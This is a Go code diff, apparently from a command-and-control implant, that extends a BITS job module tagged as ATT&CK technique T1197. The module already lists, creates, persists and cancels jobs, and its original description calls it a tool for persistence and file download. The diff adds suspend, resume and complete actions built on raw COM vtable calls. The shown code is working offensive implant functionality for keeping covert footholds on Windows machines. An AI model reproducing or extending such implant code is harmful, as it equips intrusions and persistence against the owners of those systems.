@@ -22,7 +22,7 @@ func (c *BitsCommand) Name() string {
 }
 
 func (c *BitsCommand) Description() string {
-	return "Manage BITS transfer jobs for persistence and file download (T1197)"
+	return "Manage BITS transfer jobs — list, create, persist, cancel, suspend, resume, complete (T1197)"
 }
 
 type bitsArgs struct {
@@ -124,9 +124,15 @@ func (c *BitsCommand) Execute(task structs.Task) structs.CommandResult {
 		return bitsPersist(args)
 	case "cancel":
 		return bitsCancel(args)
+	case "suspend":
+		return bitsJobAction(args, bitsJobVtSuspend, "Suspended")
+	case "resume":
+		return bitsJobAction(args, bitsJobVtResume, "Resumed")
+	case "complete":
+		return bitsJobAction(args, bitsJobVtComplete, "Completed")
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use: list, create, persist, cancel)", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s (use: list, create, persist, cancel, suspend, resume, complete)", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -570,6 +576,79 @@ func bitsCancel(args bitsArgs) structs.CommandResult {
 
 	return structs.CommandResult{
 		Output:    fmt.Sprintf("[+] Cancelled %d BITS job(s) named: %s", cancelled, args.Name),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+// bitsJobAction performs a vtable action (suspend/resume/complete) on a BITS job by name.
+func bitsJobAction(args bitsArgs, vtableOffset uintptr, actionLabel string) structs.CommandResult {
+	if args.Name == "" {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: name is required for %s action (use 'list' to find job names)", strings.ToLower(actionLabel)),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	mgr, cleanup, err := bitsConnect()
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error connecting to BITS: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer cleanup()
+
+	var pEnum uintptr
+	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error enumerating BITS jobs: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer bitsComCall(pEnum, 2)
+
+	var count uint32
+	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))
+
+	acted := 0
+	for i := uint32(0); i < count; i++ {
+		var pJob uintptr
+		var fetched uint32
+		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
+		if int32(hr) < 0 || fetched == 0 {
+			break
+		}
+
+		var namePtr uintptr
+		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
+		name := ""
+		if namePtr != 0 {
+			name = bitsReadWString(namePtr)
+			bitsCoTaskMemFree(namePtr)
+		}
+
+		if strings.EqualFold(name, args.Name) {
+			bitsComCall(pJob, vtableOffset)
+			acted++
+		}
+
+		bitsComCall(pJob, 2)
+	}
+
+	if acted == 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("No BITS job found with name: %s", args.Name),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output:    fmt.Sprintf("[+] %s %d BITS job(s) named: %s", actionLabel, acted, args.Name),
 		Status:    "success",
 		Completed: true,
 	}
